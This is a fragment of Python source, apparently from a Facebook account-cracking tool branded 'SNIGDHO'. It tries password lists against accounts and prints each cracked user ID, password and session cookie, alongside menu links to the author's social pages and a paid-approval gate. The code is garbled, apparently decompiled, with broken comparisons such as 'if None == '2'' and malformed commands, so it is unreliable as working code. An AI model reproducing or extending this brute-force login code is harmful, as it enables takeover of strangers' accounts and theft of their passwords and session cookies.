...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-https://www.facebook.com/devilsnigdho.00')
        return None
    if None == '3':
        os.system('xdg-https://youtube.com/channel/UCI2A0fpKv3-Dqg4BIGTmhUw ')
        return None
    if None == '4':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(SNIGDHO-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[SNIGDHO] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 def Subscraption():
	...
	if key1 in r1:
		...
		print(logo)
		print ("")
		print(" \033[1;32m    Toll Free BUT You Need Get Approved First\033[1;37m\n")
